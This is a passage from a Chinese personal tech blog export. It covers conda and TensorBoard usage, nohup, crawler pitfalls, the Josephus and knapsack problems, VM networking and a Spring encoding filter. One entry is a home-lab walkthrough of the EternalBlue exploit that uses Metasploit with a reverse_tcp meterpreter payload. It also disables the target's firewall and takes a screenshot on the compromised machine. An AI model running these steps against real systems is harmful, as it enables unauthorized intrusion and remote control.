<li>本地进入到该轮子所在目录，在cmd中进入到对应的conda虚拟环境中，执行<code>pip install 轮子</code></li>
<li>解决成功</li>
</ol>
<h5 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h5><p>检测如下（但不绝对，有些人就没有显示cpu版本，但还是报错用不了gpu版本）：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240419154151.png" alt="在这里插入图片描述"></p>
<ol>
<li>如果发现列表中有<code>cpuonly</code>依赖，则直接到下一步，否则执行<code>conda install cpuonly</code></li>
<li>执行<code>conda uninstall cpuonly</code></li>
<li>解决成功，cpu版本转为了gpu版本</li>
</ol>
<h2 id="conda环境移植"><a href="#conda环境移植" class="headerlink" title="conda环境移植"></a>conda环境移植</h2><p>思路：先导出环境配置文件、依赖包信息，然后到目标计算机中使用该配置文件创建新的环境</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">conda env <span class="keyword">export</span> --no-builds &gt; environment.yml   <span class="comment">// 添加 --no-builds 参数，可以防止构建信息包含在生成的环境文件中，从而减少等号的数量。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">conda env create -f environment.yml				 <span class="comment">// 在新环境中创建环境</span></span><br></pre></td></tr></table></figure>

<h2 id="使用TensorBoard数据可视化"><a href="#使用TensorBoard数据可视化" class="headerlink" title="使用TensorBoard数据可视化"></a>使用TensorBoard数据可视化</h2><h4 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install tensorboard </span><br></pre></td></tr></table></figure>



<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
<li><p>将模型生成的日志数据整理一下，然后需要写入<code>tensorboard</code>专门的日志目录中（会自动生成专门的日志文件，内部是字节数据）</p>
<ul>
<li>原始的日志数据内容如下，待提取数据，从而写入<code>tensorboard</code>对应的日志中<br><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240412164440.png" alt="image-20240412164438407"></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"></span><br><span class="line">log_file = <span class="string">&#x27;./log/log_train_epoch.txt&#x27;</span>  <span class="comment"># 输入你的原始的日志文件路径</span></span><br><span class="line">log_dir = <span class="string">&#x27;./log/logs&#x27;</span>  <span class="comment"># 输入你的TensorBoard日志目录路径（会自动在内部生成字节型的日志文件）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个写入器（Writer）来将数据写入TensorBoard日志文件</span></span><br><span class="line">writer = tf.summary.create_file_writer(log_dir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 解析每行的数据</span></span><br><span class="line">        data = line.strip().split()</span><br><span class="line"></span><br><span class="line">        epoch = <span class="built_in">int</span>(data[<span class="number">0</span>].split(<span class="string">&#x27;Epoch&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        time = <span class="built_in">float</span>(data[<span class="number">1</span>].split(<span class="string">&#x27;Time:&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        loss = <span class="built_in">float</span>(data[<span class="number">3</span>].split(<span class="string">&#x27;Loss:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        xent = <span class="built_in">float</span>(data[<span class="number">4</span>].split(<span class="string">&#x27;Xent:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        htri = <span class="built_in">float</span>(data[<span class="number">5</span>].split(<span class="string">&#x27;Htri:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        div_loss = <span class="built_in">float</span>(data[<span class="number">6</span>].split(<span class="string">&#x27;div_loss:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">        accuracy = <span class="built_in">float</span>(data[<span class="number">7</span>].split(<span class="string">&#x27;Acc:&#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 将数据写入TensorBoard日志文件</span></span><br><span class="line">        <span class="keyword">with</span> writer.as_default():</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Epoch&quot;</span>, epoch, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Time&quot;</span>, time, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Loss&quot;</span>, loss, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Xent&quot;</span>, xent, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Htri&quot;</span>, htri, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;div_loss&quot;</span>, div_loss, step=epoch)</span><br><span class="line">            tf.summary.scalar(<span class="string">&quot;Accuracy&quot;</span>, accuracy, step=epoch)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭写入器</span></span><br><span class="line">writer.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>生成的<code>tensorboard</code>对应的日志文件如下：<br><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240412164647.png" alt="image-20240412164646245"></li>
</ul>
</li>
<li><p>使用<code>tensorboard</code>的cmd命令，使用日志文件生成图片网页</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 在命令行终端，输入tensorboard命令进行可视化</span><br><span class="line">tensorboard --logdir=日志文件存放的目录</span><br><span class="line"># 例：日志文件存放在log文件夹下，则写法如下</span><br><span class="line">tensorboard --logdir=./log</span><br></pre></td></tr></table></figure>

<ul>
<li>执行效果如下：<br><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240412164911.png" alt="image-20240412164910887"></li>
</ul>
</li>
</ol>
<h3 id="常见错误-1"><a href="#常见错误-1" class="headerlink" title="常见错误"></a>常见错误</h3><h4 id="错误1-1"><a href="#错误1-1" class="headerlink" title="错误1"></a>错误1</h4><p>报错如下：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">AttributeError: <span class="title">module</span> &#x27;<span class="title">numpy</span>&#x27; <span class="title">has</span> <span class="title">no</span> <span class="title">attribute</span> &#x27;<span class="title">object</span>&#x27;.</span></span><br></pre></td></tr></table></figure>

<p><strong>解释：</strong></p>
<p>Since version 1.24 of numpy, <code>np.object</code> is deprecated, and needs <a href="https://so.csdn.net/so/search?q=to&spm=1001.2101.3001.7020">to</a> be replaced with <code>object</code> (cf. <a href="https://numpy.org/devdocs/release/1.20.0-notes.html#deprecations">numpy release notes</a>).</p>
<p>就是说1.24以后版本的numpy，<code>np.object</code> 废弃了，如果需要使用，需要降低版本</p>
<p><strong>解决：</strong></p>
<p>numpy版本降低，我降到了1.23.5后，就成功运行了，效果如下图：</p>
<p><img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/20240412165509.png" alt="image-20240412165508998"></p>
<h2 id="VSCode关闭后，服务器进程保持运行"><a href="#VSCode关闭后，服务器进程保持运行" class="headerlink" title="VSCode关闭后，服务器进程保持运行"></a>VSCode关闭后，服务器进程保持运行</h2><p><strong>场景</strong></p>
<p>VSCode连接远程服务器，跑了一个进程，由于需要关闭VSCode，导致进程也终止了。</p>
<p><strong>解决</strong></p>
<p>可以使用如下命令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nohup python webapp.py &amp;</span><br></pre></td></tr></table></figure>

<p><strong>解释</strong></p>
<ol>
<li><code>nohup</code>: 这是一个命令，表示在后台运行命令并忽略挂断信号（SIGHUP）。它允许命令在终端关闭或用户注销后继续执行。</li>
<li><code>python train.py</code>: 这是您要在后台运行的命令。它指示系统运行名为 <code>train.py</code> 的 Python 脚本。您可以将其替换为您要运行的实际脚本的名称和路径。</li>
<li><code>&amp;</code>: 这是一个特殊的符号，表示将命令放入后台运行。它允许您在执行命令后<strong>继续使用终端</strong>，而不必等待命令完成。（不加则会占用终端，但是终端不打印信息）</li>
</ol>
<p>可以使用<code>ps -ef | grep python</code>来查看后台运行的进程，或者使用<code>tail -f nohup.out</code>来查看输出日志。</p>
]]></content>
      <tags>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>爬取网站常见错误</title>
    <url>/2023/05/29/%E7%88%AC%E5%8F%96%E7%BD%91%E7%AB%99%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF/</url>
    <content><![CDATA[<h2 id="爬虫常见错误"><a href="#爬虫常见错误" class="headerlink" title="爬虫常见错误"></a>爬虫常见错误</h2><span id="more"></span>

<ol>
<li><p>url构造出错</p>
</li>
<li><p>referer中的一些参数有必要和url中的参数一样，需要动态变化</p>
</li>
<li><p>返回响应数据中，需要的数据不存在（越界，为空，获取到链接但网络资源不存在从而抛出异常）</p>
</li>
<li><p>解析数据，格式错误</p>
</li>
<li><p>存储数据库时，id（主键）错误、重复</p>
</li>
<li><p>在post请求，进入开发者工具，找到请求连接，最好找最后一次的请求链接，否则（使用最后一次之前的请求链接中的负载参数）可能所获得的响应中不包含全部的数据（即不完整）</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>约瑟夫问题——坏人必须死</title>
    <url>/2021/05/27/%E7%BA%A6%E7%91%9F%E5%A4%AB%E9%97%AE%E9%A2%98%E2%80%94%E2%80%94%E5%9D%8F%E4%BA%BA%E5%BF%85%E9%A1%BB%E6%AD%BB/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><span id="more"></span>

<img src="https://i.loli.net/2021/05/27/u1ylWdAFIU2B8jb.png" alt="Image.png" style="zoom: 67%;" />

<h2 id="题意理解"><a href="#题意理解" class="headerlink" title="题意理解"></a>题意理解</h2><p>经思考，发现可以这么理解题意：有2m个人，然后进行报数，相当于前一个数字加上k，若结果大于m且小于等于2m，则为坏人，则需要总人数-1，即坏人还剩m-1人；若出现结果大于等于1且小于等于m的，则该k值不符合需求，需要将k++。直至坏人总数为0。</p>
<ol>
<li>需要注意的是，在不断地取余过程中，会出现0这个数，所以，我们最好用0来代替2m的意思</li>
<li>此外，需要特别注意的有一点，就是每次加上k进行取余的过程中，需要注意原先位置是不是0，若是，则不许奥倒退（即减一），否则需要先倒退（即减一）后再进行取余，计算下一个位置</li>
</ol>
<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><pre><code>#include &lt;stdio.h&gt;

int main() &#123;
int m, n, k, rest, pos;
while (scanf(&quot;%d&quot;, &amp;m) != EOF) &#123;
    n = m * 2;
    rest = m;
    k = m;
    pos = k % n;
    while (rest != 0) &#123;
        rest = m;
        n = m * 2;
        k++;
        pos = k % n;
        while (pos &gt; m &amp;&amp; pos &lt; n || (pos == 0 &amp;&amp; rest != 0)) &#123;
            n--;
            rest--;
            //
            if (pos == 0) &#123;        /*此情况易忽略*/
                pos = (pos + k) % n;
            &#125;
            else &#123;
                pos = (pos - 1 + k) % n;
            &#125;
            //
            //pos = (pos - 1 + k) % n;    /*很容易写成这个情况*/
        &#125;
    &#125;
    printf(&quot;%d\n&quot;, k);
&#125;
return 0;
&#125;
</code></pre>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>约瑟夫问题</tag>
      </tags>
  </entry>
  <entry>
    <title>背包算法</title>
    <url>/2021/05/27/%E8%83%8C%E5%8C%85%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="例题分析-gt-共同特性（理解重点）"><a href="#例题分析-gt-共同特性（理解重点）" class="headerlink" title="例题分析-&gt;共同特性（理解重点）"></a>例题分析-&gt;共同特性（理解重点）</h2><span id="more"></span>

<blockquote>
<p>有N件物品和一个容量为V的背包，第i件物品的费用是value[i]，价值是weight[i]，求解将哪些物品装入背包可使这些物品的费用总和不超过背包容量，且价值总和最大？</p>
</blockquote>
<p>经过分析，我总结出，这一类的问题都有一下<strong>共同特点</strong>（<strong>都能分析出三个值：“最大量”、“属性1”、“属性2”</strong>）：</p>
<ol>
<li><p>有一个<strong>最大量</strong>，本题中这个最大限制量是<strong>容量</strong>（当然也可以是其他量，比如说我还碰到的“体力值”）（而有时候这个最大量是隐性给出，就是物体的个数）</p>
</li>
<li><p>进行操作的每一个单位有<strong>两个属性值</strong>，本题中分别是<strong>重量</strong>和<strong>价值</strong></p>
</li>
<li><p>2中所提及到的两个属性值，一个是用来和<strong>最大量</strong>进行比较，从而确定选取方案；另一个属性值是用来<strong>获取最值</strong>，比如说本题中的“价值总和最大”（这个属性值有时候是隐性给出的，例如只给出第一个属性，第二个属性值每一个物体默认是一样的）</p>
</li>
</ol>
<h2 id="通用的基础公式（理解重点）"><a href="#通用的基础公式（理解重点）" class="headerlink" title="通用的基础公式（理解重点）"></a>通用的基础公式（理解重点）</h2><p>定义**dp[i][j]**：表示前i个物品，在容量为j的时候，最佳方案所能得到的最大总价值。</p>
<ol>
<li><strong>约束条件：</strong>weight[x1]+weight[x2]+…… &lt; j（同时j&lt;=V，该条件可以用来作为循环遍历的约束条件）</li>
<li><strong>通项公式：</strong><blockquote>
<p>**dp[i][j] = dp[i-1][j]**，weight[i] &gt; j时，</p>
<p>**dp[i][j] = max{dp[i-1][j]，dp[i-1][j-weight[i] + value[i]}**，j &gt;= weight[i]时</p>
</blockquote>
</li>
</ol>
<h3 id="dp二维数组如下："><a href="#dp二维数组如下：" class="headerlink" title="dp二维数组如下："></a>dp二维数组如下：</h3>]]></content>
      <tags>
        <tag>算法</tag>
        <tag>背包问题</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机中网络配置</title>
    <url>/2022/05/03/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="三种连接模式"><a href="#三种连接模式" class="headerlink" title="三种连接模式"></a>三种连接模式</h2><span id="more"></span>

<h3 id="模式介绍"><a href="#模式介绍" class="headerlink" title="模式介绍"></a>模式介绍</h3><ul>
<li><strong>桥接模式：</strong>桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。<br>如果需要远程连接（需要虚拟机的IP地址）时，需要知道或者自定义设置一下虚拟机的ip地址，网关，dns等（不要设置为自动识别的）</li>
<li><strong>Net模式：</strong>NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网</li>
<li><strong>仅主机模式：</strong>（还没有研究）</li>
</ul>
<h3 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h3><ol>
<li><strong>配置虚拟网卡：</strong>在虚拟网络编辑器中，需要有自己需要用到的虚拟网卡，其中VMnet0一般就是桥接模式的网卡，另外两种见名知意。如果没有VMnet0，可以 更改设置–&gt;还原默认设置–&gt;确定，然后就有了。（有时候桥接模式可能还需要指定桥接至主机中的哪一个具体网卡）<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503140513670.png" alt="image-20220503140513670"></li>
<li><strong>虚拟机选择连接模式：</strong><br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503141011124.png" alt="image-20220503141011124"></li>
<li>然后在虚拟机中开始使用<strong>有线连接网络</strong>或者<strong>无线连接网络</strong>，就可以上网了。</li>
</ol>
<h2 id="连接网络方式"><a href="#连接网络方式" class="headerlink" title="连接网络方式"></a>连接网络方式</h2><h3 id="使用有线连接"><a href="#使用有线连接" class="headerlink" title="使用有线连接"></a>使用有线连接</h3><p>如果使用有线连接，可能会出现一些问题，有些路由器出于安全考虑，在使用桥接模式的时候，并不会分配给虚拟机一个ip，导致无法成功连接上网络（例如校园wife路由器）（但是例如个人热点就可以使用桥接模式下的有线连接方式）。</p>
<p>如果就想用桥接模式连接校园wife，也不是不可以，方法就是使用无线连接。</p>
<h3 id="使用无线连接"><a href="#使用无线连接" class="headerlink" title="使用无线连接"></a>使用无线连接</h3><p>需要一个外接网卡</p>
<ol>
<li><p>查看虚拟机与网卡USB接口的兼容性</p>
<p><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133346748.png" alt="image-20220503133346748"></p>
</li>
<li><p>让自己的虚拟机兼容外接网卡的接口类型<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133459046.png" alt="image-20220503133459046"></p>
</li>
<li><p>切断外接网卡与主机的连接，连接虚拟机<br><img src="https://gitee.com/mushroom_man/imgs/raw/master/img/image-20220503133658889.png" alt="image-20220503133658889"></p>
</li>
<li><p>连接wife，开始冲浪！</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>虚拟机之间的入侵——永恒之蓝</title>
    <url>/2021/05/23/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%A5%E4%BE%B5%E2%80%94%E2%80%94%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    <content><![CDATA[<h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><span id="more"></span>

<p>1.进入虚拟机，查看两台虚拟机的IP地址，输入命令行如下：<br>    <code>ifconfig</code>  //这是在kali虚拟机中查看IP地址的命令<br><strong>效果如下图所示</strong><br><img src="https://i.loli.net/2021/05/23/1GTF679moSNYIL5.png" alt="屏幕截图 2021-05-23 175940.png"></p>
<pre><code>`ipconfig`  //这是在Windows中的查看IP地址的命令
</code></pre>
<p><strong>效果如图</strong><br><img src="https://i.loli.net/2021/05/23/mKGT52szxED4j6C.png" alt="1.png"></p>
<p>2.在kali虚拟集中依次输入如下命令：<br>    msfconsole                //打开”美少妇”）<br>    use exploit/multi/handler<br>    use exploit/windows/smb/ms17_010_eternalblue<br>    set payload windows/x64/meterpreter/reverse_tcp<br>    set RHOST 192.168.<em>.</em>      //（目标机的IP地址）<br>    run<br><strong>效果如图所示即表示成功</strong><br><img src="https://i.loli.net/2021/05/23/mvCJyDIMUHRo8pb.png" alt="屏幕截图 2021-05-23 204741.png"></p>
<blockquote>
<p>如若失败，则可能需要对目标虚拟机进行以下操作<br> 使用管理员省份打开cmd，输入以下代码</p>
<p><code>netsh advfirewall set allprofiles state off</code></p>
<p><strong>效果应该如图所示，出现“确定”即为成功</strong><br><img src="https://i.loli.net/2021/05/23/Fzc4wAVqdGKS1bZ.png" alt="屏幕截图 2021-05-23 205802.png"></p>
</blockquote>
<p>3.举例：控制对方的电脑截个屏，并获取照片<br>    screenshot        //截屏<br><img src="https://i.loli.net/2021/05/23/nlOxuUZqJvpBANT.png" alt="屏幕截图 2021-05-23 210457.png"></p>
<p>图片文件保存的路径在命令行中显示的地址处，如下：<br><img src="https://i.loli.net/2021/05/23/cAqGLFyilZboErQ.png" alt="屏幕截图 2021-05-23 210920.png"></p>
]]></content>
  </entry>
  <entry>
    <title>解决spring中Get、Post请求出现的乱码</title>
    <url>/2021/11/15/%E8%A7%A3%E5%86%B3spring%E4%B8%ADGet%E3%80%81Post%E8%AF%B7%E6%B1%82%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B9%B1%E7%A0%81/</url>
    <content><![CDATA[<h2 id="Spring的Get、POST请求的中文乱吗"><a href="#Spring的Get、POST请求的中文乱吗" class="headerlink" title="Spring的Get、POST请求的中文乱吗"></a>Spring的Get、POST请求的中文乱吗</h2><span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lry.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解决get和post请求 全部乱码的过滤器</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//处理response的字符编码</span></span><br><span class="line">        HttpServletResponse myResponse=(HttpServletResponse) response;</span><br><span class="line">        myResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转型为与协议相关对象</span></span><br><span class="line">        HttpServletRequest httpServletRequest = (HttpServletRequest) request;</span><br><span class="line">        <span class="comment">// 对request包装增强</span></span><br><span class="line">        HttpServletRequest myrequest = <span class="keyword">new</span> MyRequest(httpServletRequest);</span><br><span class="line">        chain.doFilter(myrequest, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义request对象，HttpServletRequest的包装类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRequest</span> <span class="keyword">extends</span> <span class="title">HttpServletRequestWrapper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="comment">//是否编码的标记</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> hasEncode;</span><br><span class="line">    <span class="comment">//定义一个可以传入HttpServletRequest对象的构造函数，以便对其进行装饰</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyRequest</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request);<span class="comment">// super必须写</span></span><br><span class="line">        <span class="keyword">this</span>.request = request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对需要增强方法 进行覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getParameterMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 先获得请求方式</span></span><br><span class="line">        String method = request.getMethod();</span><br><span class="line">        <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;post&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// post请求</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 处理post乱码</span></span><br><span class="line">                request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> request.getParameterMap();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equalsIgnoreCase(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// get请求</span></span><br><span class="line">            Map&lt;String, String[]&gt; parameterMap = request.getParameterMap();</span><br><span class="line">            <span class="keyword">if</span> (!hasEncode) &#123; <span class="comment">// 确保get手动编码逻辑只运行一次</span></span><br><span class="line">                <span class="keyword">for</span> (String parameterName : parameterMap.keySet()) &#123;</span><br><span class="line">                    String[] values = parameterMap.get(parameterName);</span><br><span class="line">                    <span class="keyword">if</span> (values != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                <span class="comment">// 处理get乱码</span></span><br><span class="line">                                values[i] = <span class="keyword">new</span> String(values[i]</span><br><span class="line">                                                       .getBytes(<span class="string">&quot;ISO-8859-1&quot;</span>), <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                                e.printStackTrace();</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                hasEncode = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> parameterMap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getParameterMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取一个值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getParameter</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, String[]&gt; parameterMap = getParameterMap();</span><br><span class="line">        String[] values = parameterMap.get(name);</span><br><span class="line">        <span class="keyword">if</span> (values == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> values[<span class="number">0</span>]; <span class="comment">// 取回参数的第一个值</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取所有值</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String name) &#123;</span><br><span class="line">        Map&lt;String, String[]&gt; parameterMap = getParameterMap();</span><br><span class="line">        String[] values = parameterMap.get(name);</span><br><span class="line">        <span class="keyword">return</span> values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Spring</tag>
        <tag>中文乱码</tag>
        <tag>Get、Post请求</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式6大原则-开闭原则+依赖倒置原则</title>
    <url>/2021/10/20/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F6%E5%A4%A7%E5%8E%9F%E5%88%99-%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99-%E4%BE%9D%E8%B5%96%E5%80%92%E7%BD%AE%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<h2 id="开闭原则（OCP）"><a href="#开闭原则（OCP）" class="headerlink" title="开闭原则（OCP）"></a>开闭原则（OCP）</h2><span id="more"></span>

<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>一个<strong>软件实体</strong>应当<strong>对扩展开放，对修改关闭（对原有代码尽量少进行修改，甚至不做修改，仅做扩展）</strong>。</p>
<p>开闭原则在<strong>定义实体类、功能模块类等</strong>的时候会体现的较为明显。</p>
<p>通俗的讲，添加一个功能应该是在已有的代码基础上进行扩展，而不是修改已有的代码。</p>
<h3 id="作用（目的）"><a href="#作用（目的）" class="headerlink" title="作用（目的）"></a>作用（目的）</h3><p><strong>我们为什么要遵循这个开闭原则呢？</strong></p>
<p>可能有很多人会觉得，在原来的代码基础上进行修改，好像没有出现什么问题或者困难。</p>
<p>原因就是在于要么运气好没遇到，要么就是项目还是太简单了，遇到的概率自然就会小。</p>
<p><strong>那么都会有哪些问题呢？</strong></p>
<p>后添加的功能，可能与原来的写好的代码，使用的依赖库不一样，也可能是原来的代码中有一些判断和后添加的功能所需要的判断在逻辑上较难分析……还有很多情况。</p>
<p>但是这些情况都是说明了一件事情，就是如果因为后添加的功能模块或者实体类，而修改了原来的代码，都可能会<strong>造成一定的风险</strong>或者<strong>程序上编写的困难</strong>。</p>
<p><strong>开闭原则好处</strong></p>
<p>此时我们如果按照开闭原则，有一个接口类，我们只需要再写一个实体类或者功能模块类implements接口类就行，有什么需求在接口中定义好方法后，在派生类中进行具体实现就行。（<strong>如此一来，降低了编程难度，降低了程序修改的风险</strong>）</p>
<p><strong>！！！重要的是说三遍！！！</strong></p>
<p><strong>优点：不用修改原来的代码</strong></p>
